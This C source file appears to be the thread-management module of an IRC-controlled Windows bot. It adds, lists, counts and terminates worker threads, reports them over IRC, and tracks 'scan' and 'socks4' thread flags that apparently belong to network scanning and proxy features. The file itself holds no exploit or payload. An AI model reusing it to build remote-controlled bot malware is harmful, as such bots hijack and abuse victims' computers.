#include "include.h"
#include "extern.h"

int addthread(const char *name, const char *desc)
/* add a thread */
{
	int i;
	for(i = 0; i < 512; i++)
	{
		if(!thread[i].name[0])
		{
			strncpy(thread[i].name, name, sizeof(thread[i].name));
			strncpy(thread[i].desc, desc, sizeof(thread[i].desc));
			break;
		}
	}
	if(!thread[i].name[0])
		return -1;
	return i;
}

int numthread(const char *name)
/* count number of threads */
{
	int i;
	int n;
	for(i = 0, n = 0; i < 512; i++)
	{
		if(!thread[i].name[0])
			continue;
		else if(!strcmp(name, thread[i].name))
			n++;
	}
	return n;
}

bool killthreadid(int tnum)
/* kill thread by id */
{
	if(!thread[tnum].handle)
		return false;
	TerminateThread(thread[tnum].handle, 0);
	thread[tnum].handle = 0;
	if(thread[tnum].scan)
	{
		thread[tnum].scan = false;
		scan_active = false;
	}
	if(thread[tnum].socks4)
	{
		thread[tnum].socks4 = false;
		socks4_active = false;
	}
	memset(thread[tnum].name, 0, sizeof(thread[tnum].name));
	memset(thread[tnum].desc, 0, sizeof(thread[tnum].desc));
	return true;
}

void listthreads(const char *target)
/* list all threads */
{
	int i;
	for(i = 0; i < 512; i++)
	{
		if(thread[i].name[0])
			irc_privmsg(target, "%d. %s (%s)", i, thread[i].name, thread[i].desc);
	}
}

void killthread(const char *name)
/* kill thread by name */
{
	int i;
	for(i = 0; i < 512; i++)
	{
		if(!thread[i].name[0])
			continue;
		else if(!strcmp(name, thread[i].name))
		{
			TerminateThread(thread[i].handle, 0);
			thread[i].handle = 0;
			if(thread[i].scan)
			{	
				thread[i].scan = false;
				scan_active = false;
			}
			if(thread[i].socks4)
			{
				thread[i].socks4 = false;
				socks4_active = false;
			}
			memset(thread[i].name, 0, sizeof(thread[i].name));
			memset(thread[i].desc, 0, sizeof(thread[i].desc));
		}
	}
}

void killthreadall()
/* kill all threads */
{
	int i;
	for(i = 0; i < 512; i++)
	{
		if(thread[i].name[0])
			killthreadid(i);
	}
}

void clearthread(int tnum)
/* clear a thread */
{
	thread[tnum].handle = 0;
	if(thread[tnum].scan)
	{
		thread[tnum].scan = false;
		scan_active = false;
	}
	if(thread[tnum].socks4)
	{
		thread[tnum].socks4 = false;
		socks4_active = false;
	}
	memset(thread[tnum].name, 0, sizeof(thread[tnum].name));
	memset(thread[tnum].desc, 0, sizeof(thread[tnum].desc));
}

void clearthreadall()
/* clear all threads */
{
	int i;
	for(i = 0; i < 512; i++)
		clearthread(i);
}
